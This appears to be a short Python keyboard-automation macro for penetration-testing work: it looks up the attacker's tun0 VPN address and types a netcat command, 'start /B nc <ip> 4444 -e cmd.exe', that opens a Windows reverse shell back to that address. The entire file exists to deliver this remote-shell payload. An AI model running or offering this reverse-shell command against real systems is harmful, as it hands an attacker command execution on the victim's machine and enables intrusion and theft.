import netifaces as ni


try:
  ni.ifaddresses('tun0')
  tun_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']

except ValueError:
  dialog.info_dialog('tun0 not found', 'Can not obtain tun0 IP. Is the device connected?')
  
else:
    keyboard.send_keys("start /B nc "+ tun_ip + " 4444 -e cmd.exe")
